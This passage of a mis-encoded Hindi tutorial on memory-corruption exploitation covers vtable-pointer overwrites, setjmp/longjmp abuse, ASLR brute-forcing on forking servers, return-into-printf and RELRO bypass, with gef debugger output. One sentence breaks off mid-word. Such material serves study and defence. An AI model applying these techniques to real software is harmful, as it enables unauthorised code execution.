рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реЛрдВрдЧреЗред

### **setjmp() рдФрд░ longjmp()**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм рд╣реИ**ред
{% endhint %}

**`Setjmp()`** **рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ** рдХреЛ **рд╕реЗрд╡** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рд░рдЬрд┐рд╕реНрдЯрд░реНрд╕)\
**`longjmp()`** **рдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ** рдХреЛ **рд░рд┐рд╕реНрдЯреЛрд░** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рд╕реЗрд╡ рдХрд┐рдП рдЧрдП рд░рдЬрд┐рд╕реНрдЯрд░реНрд╕** рд╣реИрдВ: `EBX, ESI, EDI, ESP, EIP, EBP`\
рдЬреЛ рд╣реЛрддрд╛ рд╣реИ рд╡рд╣ рдпрд╣ рд╣реИ рдХрд┐ EIP рдФрд░ ESP **`PTR_MANGLE`** рдлрдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рд╡рд╣реА рд╣реИрдВ рдЬреЛ рдКрдкрд░ рд╣реИрдВ**ред\
рд╡реЗ рддреНрд░реБрдЯрд┐ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐ рдпрд╛ рдмрд╛рдзрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬреИрд╕рд╛ рдХрд┐ рдореИрдВрдиреЗ рдкрдврд╝рд╛ рд╣реИ, рдЕрдиреНрдп рд░рдЬрд┐рд╕реНрдЯрд░реНрд╕ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИрдВ, **рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдлрдВрдХреНрд╢рди рдХреЗ рдЕрдВрджрд░ `call ebx`, `call esi` рдпрд╛ `call edi` рд╣реИ** рддреЛ рдирд┐рдпрдВрддреНрд░рдг рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк EBP рдХреЛ рднреА рдореЙрдбрд┐рдлрд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ ESP рдХреЛ рдореЙрдбрд┐рдлрд╛рдИ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

**VTable рдФрд░ VPTR C++ рдореЗрдВ**

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХрд╛ рдПрдХ **Vtable** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **рдореЗрдердбреНрд╕ рдХреЗ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХрд╛ рдПрдХ рдРрд░реЗ** рд╣реЛрддрд╛ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХреА **рдСрдмреНрдЬреЗрдХреНрдЯ** рдХрд╛ рдПрдХ **VPtr** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **рдЙрд╕рдХреА рдХреНрд▓рд╛рд╕ рдХреЗ рдРрд░реЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЙрдЗрдВрдЯрд░** рд╣реЛрддрд╛ рд╣реИред VPtr рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ **VPtr** рдХрд╛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ **рдореЙрдбрд┐рдлрд╛рдИ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдПрдХ рдбрдореА рдореЗрдердб рдХреА рдУрд░ **рдЗрд╢рд╛рд░рд╛** рдХрд░реЗ рддрд╛рдХрд┐ рдПрдХ рдлрдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдкрд░ рдпрд╣ рд╢реЗрд▓рдХреЛрдб рдкрд░ рдЬрд╛рдПред

## **рдирд┐рд╡рд╛рд░рдХ рдЙрдкрд╛рдп рдФрд░ рдмрдЪрд╛рд╡**

**ASLR рдЗрддрдирд╛ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд╣реАрдВ рд╣реИ**

PaX рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрддреЗ рдХреА рдЬрдЧрд╣ рдХреЛ 3 рд╕рдореВрд╣реЛрдВ рдореЗрдВ рдмрд╛рдВрдЯрддрд╛ рд╣реИ:

рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдФрд░ рдЕрдкреНрд░рд╛рд░рдВрднрд┐рдХ рдХреЛрдб рдФрд░ рдбреЗрдЯрд╛: .text, .data рдФрд░ .bss тАФ> 16рдмрд┐рдЯреНрд╕ рдХрд╛ рдПрдВрдЯреНрд░реЛрдкреА рдбреЗрд▓реНрдЯрд╛\_exec рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ, рдпрд╣ рд╡реЗрд░рд┐рдПрдмрд▓ рд╣рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд░реВрдк рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрддреЛрдВ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ

mmap() рджреНрд╡рд╛рд░рд╛ рдЖрд╡рдВрдЯрд┐рдд рдореЗрдореЛрд░реА рдФрд░ рд╕рд╛рдЭрд╛ рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ тАФ> 16рдмрд┐рдЯреНрд╕, рдбреЗрд▓реНрдЯрд╛\_mmap

рд╕реНрдЯреИрдХ тАФ> 24рдмрд┐рдЯреНрд╕, рдбреЗрд▓реНрдЯрд╛\_рд╕реНрдЯреИрдХ тАФ> рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ 11 (10рд╡реЗрдВ рдмрд╛рдЗрдЯ рд╕реЗ 20рд╡реЗрдВ рдмрд╛рдЗрдЯ рддрдХ рд╕рдореНрдорд┐рд▓рд┐рдд) тАФ> 16рдмрд╛рдЗрдЯреНрд╕ рдХреЗ рдЕрдиреБрд░реВрдк тАФ> 524,288 рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕реНрдЯреИрдХ рдкрддреЗ

рдкрд░реНрдпрд╛рд╡рд░рдгреАрдп рдЪрд░ рдФрд░ рддрд░реНрдХ рд╕реНрдЯреИрдХ рдкрд░ рдПрдХ рдмрдлрд░ рд╕реЗ рдХрдо рд╡рд┐рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддреЗ рд╣реИрдВред

**Return-into-printf**

рдпрд╣ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХреЛ рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдореЗрдВ рдмрджрд▓ рджреЗрддреА рд╣реИред рдпрд╣ EIP рдХреЛ рдмрджрд▓рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рдлрдВрдХреНрд╢рди рдХреЗ рдПрдХ printf рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗ рдФрд░ рдЙрд╕реЗ рдПрдХ рдореИрдирд┐рдкреБрд▓реЗрдЯреЗрдб рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд░реЗ рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдореВрд▓реНрдп рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХреЗрдВред

**рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ рдкрд░ рд╣рдорд▓рд╛**

рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬ 16рдмрд┐рдЯреНрд╕ рдХреА рдпрд╛рджреГрдЪреНрдЫрд┐рдХрддрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реЛрддреА рд╣реИрдВ = 65636 рд╕рдВрднрд╛рд╡рд┐рдд рдкрддреЗред рдЕрдЧрд░ рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд░реНрд╡рд░ fork() рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рддреЛ рдореЗрдореЛрд░реА рдХреА рдкрддреЗ рдХреА рдЬрдЧрд╣ рдмрдЪреНрдЪреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреНрд▓реЛрди рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рдпрд╣ рдЕрдЫреВрддреА рд░рд╣рддреА рд╣реИред рдЗрд╕рд▓рд┐рдП libc рдХреЗ usleep() рдлрдВрдХреНрд╢рди рдХреЛ "16" рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рддрд░реНрдХ рдкрд╛рд╕ рдХрд░рдХреЗ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рддрд╛рдХрд┐ рдЬрдм рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рд▓реЗрддрд╛ рд╣реИ рддреЛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдореЗрдВ рдЙрд╕ рдлрдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЙрд╕ рдлрдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдЬрд╛рдирдиреЗ рдХреЗ рдмрд╛рдж рдбреЗрд▓реНрдЯрд╛\_mmap рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЕрдиреНрдп рдХреА рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

ASLR рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ 64рдмрд┐рдЯреНрд╕ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рд╡рд╣рд╛рдВ рдХреЛрдИ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рд╣рдорд▓реЗ рдирд╣реАрдВ рд╣реИрдВред

**StackGuard рдФрд░ StackShield**

**StackGuard** EIP рд╕реЗ рдкрд╣рд▓реЗ рдбрд╛рд▓рддрд╛ рд╣реИ тАФ> 0x000aff0d(null, \n, EndOfFile(EOF), \r) тАФ> recv(), memcpy(), read(), bcoy() рдЕрднреА рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИрдВ рдФрд░ EBP рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ

**StackShield** StackGuard рд╕реЗ рдЕрдзрд┐рдХ рд╡рд┐рд╕
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
рдмрд┐рдирд╛ relro рдХреЗ:
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
**рдмрд┐рдирд╛ relro рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП**, рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ `fgets` рдХреЗ рд▓рд┐рдП `got` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХрд╛ рдкрддрд╛ `0x404018` рд╣реИред рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧреНрд╕ рдХреЛ рджреЗрдЦрддреЗ рд╣реБрдП рд╣рдо рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ `0x404000` рдФрд░ `0x405000` рдХреЗ рдмреАрдЪ рдореЗрдВ рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдкрд░рдорд┐рд╢рди `rw`** рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рдЗрд╕реЗ рдкрдврд╝ рдФрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред **relro рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП**, рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЗ рдЪрд▓рдиреЗ рдХреЗ рд▓рд┐рдП `got` рдЯреЗрдмрд▓ рдХрд╛ рдкрддрд╛ (pie рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рдпрд╣ рдкрддрд╛ рдмрджрд▓реЗрдЧрд╛) `0x555555557fd0` рд╣реИред рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреА рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рдореЗрдВ рдпрд╣ `0x0000555555557000` рдФрд░ `0x0000555555558000` рдХреЗ рдмреАрдЪ рдореЗрдВ рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдореЗрдореЛрд░реА **рдкрд░рдорд┐рд╢рди `r`** рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рдХреЗрд╡рд▓ рдЗрд╕рд╕реЗ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рддреЛ **bypass** рдХреНрдпрд╛ рд╣реИ? рдореИрдВ рдЬреЛ рдЖрдорддреМрд░ рдкрд░ bypass рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реВрдБ, рд╡рд╣ рд╣реИ рдХрд┐ рдореИрдВ рд╕рд┐рд░реНрдл рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рдирд╣реАрдВ рд▓рд┐рдЦрддрд╛ рдЬрд┐рдиреНрд╣реЗрдВ relro рдХреЗ рдХрд╛рд░рдг рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдФрд░ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдЕрд▓рдЧ рддрд░реАрдХрд╛ рдвреВрдВрдврддрд╛ рд╣реВрдБ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдЬрд░реВрд░реА рд╣реИ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рд╕реЗ рдкрд╣рд▓реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдкрддреЗ рдкрддрд╛ рд╣реЛрдВ:

* Lazy binding: рдПрдХ рдлрдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкрд╣рд▓реА рдмрд╛рд░ рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, GOT рдХреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
* Bind now: рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдкрддреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╣рд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдлрд┐рд░ .got, .dtors, .ctors, .dynamic, .jcr рдЬреИрд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЦрдВрдбреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред `` `** ``-z relro`**`рдФрд░`**`-z now\`\*\*

рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреЛрдИ рдкреНрд░реЛрдЧреНрд░рд╛рдо Bind now рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдЖрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
```markdown
рдЬрдм рдмрд╛рдЗрдирд░реА рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛрддреА рд╣реИ рдФрд░ рдХреЛрдИ рдлрдВрдХреНрд╢рди рдкрд╣рд▓реА рдмрд╛рд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ PLT (Procedure Linkage Table) рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣рд╛рдБ рд╕реЗ рдпрд╣ GOT (Global Offset Table) рдХреА рдУрд░ рдЬрдВрдк (jmp) рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдПрдВрдЯреНрд░реА рд╣рд▓ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реИ (рдЗрд╕рдореЗрдВ PLT рдХреЗ рдЕрдЧрд▓реЗ рдПрдбреНрд░реЗрд╕ рдХрд╛ рдбрд╛рдЯрд╛ рд╣реЛрддрд╛ рд╣реИ)ред рдЗрд╕рд▓рд┐рдП рдпрд╣ Runtime Linker рдпрд╛ rtfd рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдПрдбреНрд░реЗрд╕ рдХреЛ рд╣рд▓ рдХрд░реЗ рдФрд░ GOT рдореЗрдВ рд╕реЗрд╡ рдХрд░реЗред

рдЬрдм рдХрд┐рд╕реА рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PLT рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдлрдВрдХреНрд╢рди рдХреЗ рдПрдбреНрд░реЗрд╕ рдХрд╛ рдбрд╛рдЯрд╛ GOT рдореЗрдВ рд╕реНрдЯреЛрд░ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдлреНрд▓реЛ рдХреЛ рд╡рд╣рд╛рдБ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рддрд░рд╣ рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ рдпрд╣ рдлрдВрдХреНрд╢рди рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдХреЙрд▓ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ GOT рдореЗрдВ рдЬреЛ рд╣реЛрддрд╛ рд╣реИ рд╡рд╣ PLT рдХрд╛ рдЕрдЧрд▓рд╛ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлреНрд▓реЛ PLT рдХреЗ рдХреЛрдб (rtfd) рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрдВрдХреНрд╢рди рдХреЗ рдПрдбреНрд░реЗрд╕ рдХреЛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рдЙрд╕реЗ GOT рдореЗрдВ рд╕реЗрд╡ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред

рдЬрдм рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдХрдВрдкрд╛рдЗрд▓рд░ рдмрддрд╛рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕ рдСрдлрд╕реЗрдЯ рдкрд░ рдбрд╛рдЯрд╛ рдХреЛ рд▓реЛрдб рдХрд░рдирд╛ рд╣реИ рдЬрдм рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

Lazy binding тАФ> рдлрдВрдХреНрд╢рди рдХрд╛ рдПрдбреНрд░реЗрд╕ рдкрд╣рд▓реА рдмрд╛рд░ рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП GOT рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдЬрдм рдЦреЛрдЬрд╛ рдЬрд╛рдП, рддреЛ рд╡рд╣рд╛рдБ рд╕реЗрд╡ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рджреЛрдмрд╛рд░рд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЬрд░реВрд░рдд рди рд╣реЛред

